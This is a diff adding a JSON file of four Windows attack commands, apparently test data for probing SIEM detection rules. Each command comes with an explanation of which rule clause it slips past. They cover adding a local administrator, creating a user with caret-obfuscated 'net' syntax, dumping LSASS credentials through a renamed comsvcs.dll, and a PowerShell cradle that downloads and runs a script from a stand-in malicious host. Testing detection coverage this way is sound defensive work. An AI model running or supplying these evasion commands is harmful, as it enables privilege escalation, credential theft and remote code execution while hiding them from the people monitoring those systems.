@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe -Command \"Add-LocalGroupMember -Group 'Administrators' -Member 'testuser'\"",
+    "explanation": "Bypasses selection_child_4 by using a native PowerShell cmdlet instead of the legacy 'net.exe' utility. This evades the strict literal string match requirement for 'net', ' localgroup ', ' administrators ', and '/add'."
+  },
+  {
+    "output": "cmd.exe /c \"n^e^t u^s^e^r t^e^s^t^u^s^e^r P^a^s^s^w^o^r^d /a^d^d\"",
+    "explanation": "Bypasses selection_child_3 by utilizing DOS caret (^) obfuscation. The command executes normally within the command prompt, but evades the exact string checks for ' user ' and ' /add' in the SIEM logs."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\comsvcs.dll C:\\Windows\\Temp\\c.dll && rundll32.exe C:\\Windows\\Temp\\c.dll, MiniDump 500 lsass.bin",
+    "explanation": "Bypasses selection_child_1 and selection_child_6. By copying and renaming 'comsvcs.dll', it avoids the 'comsvcs' string check. Changing the output file extension to '.bin' avoids the '.dmp full' string check."
+  },
+  {
+    "output": "powershell.exe -NoProfile -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
+    "explanation": "The parent image is powershell.exe, which is not listed in the webserver selection, so the rule\u2019s condition on the parent will not be satisfied, causing the event to bypass the detection."
+  }
+]
